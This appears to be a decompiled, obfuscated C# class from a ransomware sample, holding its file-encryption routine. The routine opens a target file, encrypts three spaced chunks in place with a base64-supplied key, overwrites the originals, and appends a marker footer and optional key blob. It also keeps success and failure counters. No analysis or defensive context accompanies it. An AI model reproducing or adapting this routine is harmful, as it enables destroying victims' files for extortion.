using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using lKwIARJqZgRWh;

namespace PMpBbYpvEb;

internal sealed class fzmxMDmmyWAvX
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int QEjibmvnXp(long long_0)
	{
		return (int)long_0;
	}

	public static bool FptNnshurU(string xDDtBuNewOTmZ, string fZvDvlixEeV, string wNfyEdXFBWaDd, byte[] BKdBNrEdMebz = null, byte[] xLhAGGhUsfDgXY = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(xDDtBuNewOTmZ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = QEjibmvnXp(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(fZvDvlixEeV) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(fZvDvlixEeV) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(fZvDvlixEeV) * 1024 * 1024) / 10;
				}
				int iLhdqYDxvEX = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = gKfWHYwUHOAVasx(xDDtBuNewOTmZ, fileStream, iLhdqYDxvEX, num * i);
					array = (PhxOPeBqRsG.XCsezoZWotlJ ? xdhcRNHRhIrdsES.rIPxguvEmEeCvU(byte_, Convert.FromBase64String(wNfyEdXFBWaDd), xLhAGGhUsfDgXY) : ILCPTbEyPImvS.oTLflFQwfxprG(byte_, Convert.FromBase64String(wNfyEdXFBWaDd), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					FZyKWFoOOgjaP(xDDtBuNewOTmZ, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = ((!PhxOPeBqRsG.ldSVapxVzrqD) ? (PhxOPeBqRsG.WcDXYQEnYXB ? Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409380)) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409809)) + Convert.ToString(fZvDvlixEeV) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409809))) : Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409393)) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409809)) + Convert.ToString(fZvDvlixEeV) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409809)))) : (PhxOPeBqRsG.WcDXYQEnYXB ? Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409335)) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409755)) + Convert.ToString(fZvDvlixEeV) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409755))) : Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409393)) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409755)) + Convert.ToString(fZvDvlixEeV) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409755)))));
			if (!PhxOPeBqRsG.ldSVapxVzrqD)
			{
				using FileStream fileStream2 = new FileStream(xDDtBuNewOTmZ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream2 = new FileStream(xDDtBuNewOTmZ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(BKdBNrEdMebz, 0, BKdBNrEdMebz.Length);
				fileStream2.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (PhxOPeBqRsG.iJiZVjbYIelgdjs)
			{
				try
				{
					File.AppendAllText(PhxOPeBqRsG.CJWDXdtMlfSYp, getString_0(107387388) + xDDtBuNewOTmZ + getString_0(107409354) + ex.Message + getString_0(107395772));
				}
				catch (Exception)
				{
				}
			}
			PhxOPeBqRsG.jlTbuRFtzeuGOi++;
			return false;
		}
		PhxOPeBqRsG.AOxElPxfgdJ++;
		return true;
	}

	public static byte[] gKfWHYwUHOAVasx(string JFOduAzhydcH, FileStream NcWtHVYylUmgt, int iLhdqYDxvEX, int epoeflxjEg = 0)
	{
		byte[] array = new byte[iLhdqYDxvEX];
		NcWtHVYylUmgt.Position = epoeflxjEg;
		NcWtHVYylUmgt.Read(array, 0, iLhdqYDxvEX);
		return array;
	}

	public static void FZyKWFoOOgjaP(string uqYbZPvMGCuWgu, FileStream DPjHmBQJqDUHHn, byte[] LBXJNQavQLCiyjC, int dcWPOBDuyHCm = 0)
	{
		DPjHmBQJqDUHHn.Position = dcWPOBDuyHCm;
		DPjHmBQJqDUHHn.Write(LBXJNQavQLCiyjC, 0, LBXJNQavQLCiyjC.Length);
	}

	static fzmxMDmmyWAvX()
	{
		Strings.CreateGetStringDelegate(typeof(fzmxMDmmyWAvX));
	}
}
